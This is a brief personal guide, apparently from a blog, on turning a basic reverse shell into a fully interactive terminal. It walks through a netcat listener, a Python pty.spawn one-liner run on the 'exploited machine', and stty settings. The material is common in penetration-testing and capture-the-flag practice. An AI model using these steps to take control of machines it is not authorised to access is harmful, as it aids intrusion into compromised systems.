---
title: "Upgrading reverse shells (for dummys (i.e. me))"
tags: guides
---

So you got a reverse shell well done, notice something annoying: you can't ctrl+c, tab complete,
see colour. Well I get you (and me) covered.

Requirements:
- Python on exploited machine

```shell
# Start your reverse shell
nc -lvnp 31337

# After your reverse shell has connected move to a pty
# You might need to use py, python, python2 instead of python3
# If bash doesn't exist use a different shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background your shell (ctrl+z)
^Z

# Ignore keys on controlling terminal and restore shell
stty raw -echo; fg

# Enable colour output from commands
export TERM=xterm-256color
```
